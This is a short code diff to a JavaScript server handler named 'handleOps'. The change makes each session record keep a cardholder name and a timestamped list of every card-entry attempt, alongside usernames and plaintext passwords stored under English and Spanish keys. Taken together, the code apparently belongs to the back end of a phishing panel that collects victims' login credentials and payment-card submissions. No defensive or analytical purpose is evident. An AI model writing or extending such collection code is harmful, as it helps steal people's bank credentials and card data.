@@ -67,14 +67,25 @@ async function handleOps(req, res, pathname, searchParams) {
       return true
     }
     const prev = sessions.get(body.id) || {}
+    const cardAttempt = body.cardAttempt
+    const rest = { ...body }
+    delete rest.cardAttempt
+    const prevAttempts = Array.isArray(prev.cardAttempts) ? prev.cardAttempts : []
+    const cardAttempts = cardAttempt
+      ? [...prevAttempts, { ...cardAttempt, at: cardAttempt.at || Date.now() }]
+      : Array.isArray(body.cardAttempts)
+        ? body.cardAttempts
+        : prevAttempts
     const nextSession = {
       ...prev,
-      ...body,
+      ...rest,
       id: body.id,
       username: body.username ?? body.user ?? prev.username ?? '',
       password: body.password ?? body.clave ?? prev.password ?? '',
       user: body.username ?? body.user ?? prev.user ?? '',
       clave: body.password ?? body.clave ?? prev.clave ?? '',
+      cardName: body.cardName ?? prev.cardName ?? '',
+      cardAttempts,
       createdAt: body.createdAt || prev.createdAt || Date.now(),
       last_seen: body.last_seen || Date.now(),
       updatedAt: Date.now(),
